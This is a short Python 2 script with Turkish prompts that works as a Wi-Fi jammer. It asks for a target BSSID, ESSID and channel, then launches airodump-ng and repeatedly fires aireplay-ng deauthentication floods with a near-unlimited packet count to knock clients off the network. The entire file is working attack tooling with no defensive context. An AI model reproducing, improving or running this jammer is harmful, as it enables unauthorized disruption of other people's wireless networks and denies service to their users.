import os
from time import sleep



def Jammer():
	satir = "Jammer>"
	atack = raw_input(satir)
	if atack == "run":
		jammer_code = "sudo xterm -e airodump-ng -c " + kanal + " --bssid " + bssid + " wlan0mon &"
		os.system(jammer_code)
		ai = "sudo xterm -e aireplay-ng --deauth 9999999999999 -o 1 -a " + bssid + " -e " + essid + " wlan0mon &"
		os.system(ai)
		sleep(0.5)
		os.system(ai)
		sleep(0.5)
		os.system(ai)
		sleep(0.5)
		os.system(ai)
		Jammer()
	elif atack == "stop":
		os.system("sudo killall xterm")
		Jammer()
	elif atack == "geri":
		print "\njammerden cikildi...\n"
	elif atack == "baska":
                bilgi()
		Jammer()
	else:
		print "komut yok :", atack
		Jammer()




def bilgi():
	global bssid
	bssid = raw_input("Bssid : ")
	global essid
	essid = raw_input("Essid : ")
	global kanal
	kanal = raw_input("Kanal : ")
